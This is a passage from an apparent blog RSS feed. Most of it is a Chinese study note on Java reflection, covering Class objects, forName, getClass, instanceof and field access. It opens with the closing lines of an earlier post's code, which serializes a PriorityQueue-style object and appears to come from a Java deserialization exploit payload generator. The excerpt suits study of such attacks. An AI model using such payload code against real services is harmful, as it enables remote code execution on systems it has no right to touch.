&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ==================
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 生成序列化字符串
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Java学习笔记Ⅱ</title><link>https://amiaaaz.github.io/2022/02/28/java-study-notes-02/</link><pubDate>Mon, 28 Feb 2022 02:40:55 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/28/java-study-notes-02/</guid><description>&lt;p>并非Java开发要掌握的全部语法，我挑着来的（提前声明&lt;/p>
&lt;hr>
&lt;p>还是廖大的Java教程&lt;/p>
&lt;h2 id="反射">反射&lt;/h2>
&lt;p>反射Reflection可以在程序运行期，对某个实例一无所知的情况下 拿到一个对象的所有信息，调用其方法&lt;/p>
&lt;p>是十分强大的语言武器&lt;/p>
&lt;h3 id="class动态加载">Class&amp;amp;动态加载&lt;/h3>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>由JVM在执行过程中动态加载，JVM第一次读取到一种&lt;code>class&lt;/code>类型时 将其加载入内存（不遇到不会预先加载，利用这一点可以做到运行期根据条件加载不同的实现类），每加载一种&lt;code>class&lt;/code>，JVM就为其创建一个&lt;code>Class&lt;/code>类型的实例 并与其关联起来&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// class类型: 名叫Class的class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Class&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#75af00">Class&lt;/span>&lt;span style="color:#f92672">(){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>以&lt;code>String&lt;/code>类为例，当JVM加载&lt;code>String&lt;/code>类时，它首先读取&lt;code>String.class&lt;/code>入内存，然后为&lt;code>String&lt;/code>类创建一个&lt;code>Class&lt;/code>实例并关联起来&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个&lt;code>Class&lt;/code>实例的构造方法为&lt;code>private&lt;/code>，只有JVM可以创建&lt;/p>
&lt;ul>
&lt;li>JVM持有的每个&lt;code>Class&lt;/code>实例都指向一个数据类型(class or interface)&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104610572.png" alt="image-20220227104610572">&lt;/p>
&lt;ul>
&lt;li>一个&lt;code>Class&lt;/code>实例包含了该&lt;code>class&lt;/code>的所有信息，所以如果获取了某个&lt;code>Class&lt;/code>实例，我们就可以通过这个&lt;code>Class&lt;/code>实例获取到该实例对应的&lt;code>class&lt;/code>的所有信息，这就叫反射Reflection&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220227104646646.png" alt="image-20220227104646646">&lt;/p>
&lt;ul>
&lt;li>获取一个&lt;code>class&lt;/code>的&lt;code>Class&lt;/code>实例的三种方法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 通过一个class的静态变量class获取
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 已经加载某个类 获取它的java.lang.Class对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 通过实例变量的getClass方法获取
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 上下文已存在某个类的实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 通过静态方法Class.forName获取
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 前提是知道class的完整类名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.String&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>因为&lt;code>Class&lt;/code>实例在JVM中是唯一的，所以上述方法获取的&lt;code>Class&lt;/code>实例是同一个实例，可以用&lt;code>==&lt;/code>比较&lt;/li>
&lt;li>一般应该用&lt;code>instanceof&lt;/code>判断数据类型，不但匹配指定类型，还匹配指定类型的子类；而用&lt;code>==&lt;/code>判断&lt;code>class&lt;/code>实例可以精确地判断数据类型，但不能作子类型比较&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true，因为n是Integer类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true，因为n是Number类型的子类
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true，因为n.getClass()返回Integer.class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">b4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// false，因为Integer.class!=Number.class
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>通过反射获取实例的基本信息的小栗子&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 注
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Month&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">printClassInfo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Class name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Simple name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSimpleName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPackage&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Package name: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getPackage&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is interface: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isInterface&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is enum: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isEnum&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is array: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isArray&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;is primitive: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrimitive&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>String[]&lt;/code>也是一种类，不同于&lt;code>String.class&lt;/code>，它的类名是&lt;code>[Ljava.lang.String;&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>每一种基本类型对应的&lt;code>Class&lt;/code>实例可以用&lt;code>基本类型.class&lt;/code>访问&lt;/p>
&lt;/li>
&lt;li>
&lt;p>获取到&lt;code>Class&lt;/code>实例后可以用它来创建对应类型的实例，与直接new的相比，局限在于只能调用&lt;code>public&lt;/code>的无参数构造方法，而有参数的构造方法 或非&lt;code>public&lt;/code>的构造方法都无法通过&lt;code>Class.newInstance()&lt;/code>调用&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 相当于 new String()
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="访问字段">访问字段&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Class&lt;/code>类提供了以下几个方法来获取字段的（返回&lt;code>Field&lt;/code>对象&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">stdClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 根据字段名获取某个public的field(包括父类)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;score&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取public字段&amp;#34;score&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取继承的public字段&amp;#34;name&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 根据字段名获取当前类的某个field(不包括父类)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;grade&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取private字段&amp;#34;grade&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
